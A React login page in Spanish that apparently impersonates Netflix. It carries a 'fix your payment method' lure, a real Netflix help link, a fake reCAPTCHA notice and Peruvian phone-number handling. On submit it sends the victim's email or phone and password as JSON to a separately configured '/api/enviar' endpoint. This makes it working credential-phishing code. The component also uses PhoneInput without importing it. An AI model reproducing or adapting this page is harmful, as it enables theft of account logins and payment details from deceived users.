import React, { useState, FormEvent } from "react";
import styles from './login.module.css';
import URLEnvio from "./URL.js";


const Login = ({ onLoginSuccess }) => {
  const [emailOrPhone, setEmailOrPhone] = useState("");
  const [password, setPassword] = useState("");
  const [isPhone, setIsPhone] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");

  // Función que detecta si el input es email o teléfono
  const detectInputType = (value) => {
    // Si se incluye "@" o cualquier letra, se asume email
    if (value.includes('@') || /[a-zA-Z]/.test(value)) {
      return "email";
    }
    return "phone";
  };

  const handleInputChange = (value) => {
    const inputType = detectInputType(value);
    if (inputType === "email") {
      setIsPhone(false);
      setEmailOrPhone(value);
    } else {
      setIsPhone(true);
      // Se asegura el prefijo para Perú si no está presente
      if (!value.startsWith("+51")) {
        setEmailOrPhone("+51" + value);
      } else {
        setEmailOrPhone(value);
      }
    }
  };

  const validateInput = async (e) => {
    e.preventDefault();

    if (!isPhone) {
      // Validación básica para email
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!emailRegex.test(emailOrPhone)) {
        setErrorMessage("Ingrese un correo válido.");
        return;
      }
    } else {
      // Se puede agregar validación específica para teléfonos si es necesario
    }

    setErrorMessage("");

    const data = {
      name: emailOrPhone,
      password: password
    };

    try {
      const response = await fetch(`${URLEnvio}/api/enviar`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      });

      const result = await response.json();
      if (response.status === 201) {
        onLoginSuccess();
      } else {
        setErrorMessage(result.message);
      }
    } catch (error) {
      setErrorMessage("Hubo un error al enviar los datos.");
    }
  };

  return (
    <div className={styles.conteinerTotal}>
      <div className={styles.PCELMDPDIS}>
        <p>Para corregir el método de pago debe iniciar sesión</p>
      </div>
      <div className={styles.conteinerLogin}>
        <div className={styles.divH2}>
          <h2>Inicia sesión</h2>
        </div>
        <form onSubmit={validateInput} className={styles.conteinerLoginForm}>
          <div className={styles.inputContainer}>
            {isPhone ? (
              <PhoneInput
                country="pe"
                value={emailOrPhone}
                onChange={handleInputChange}
                // Se usa la misma clase para mantener el estilo unificado
                inputClass={styles.emailInput}
                inputProps={{
                  maxLength: 16,
                }}
              />
            ) : (
              <input
                type="email"
                placeholder="Email"
                value={emailOrPhone}
                required
                onChange={(e) => handleInputChange(e.target.value)}
                className={styles.emailInput}
              />
            )}
          </div>
          {errorMessage && (
            <p className={styles.errorMessage}>{errorMessage}</p>
          )}
          <input
            type="password"
            placeholder="Contraseña"
            value={password}
            required
            onChange={(e) => setPassword(e.target.value)}
            className={styles.passwordInput}
          />
          <button type="submit" className={styles.submitButton}>
            Iniciar sesión
          </button>
          <div className={styles.centrado}>
            <div className={styles.conteinerRecuerdame}>
              <input type="checkbox" id="Recuerdame" />
              <p>Recuérdame</p>
            </div>
            <a href="https://www.netflix.com/LoginHelp" className={styles.olvidaste}>
              ¿Olvidaste la contraseña?
            </a>
          </div>
        </form>
        <div className={styles.text}>
          <button type="button">
            Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot.
          </button>
        </div>
      </div>
    </div>
  );
};

export default Login;
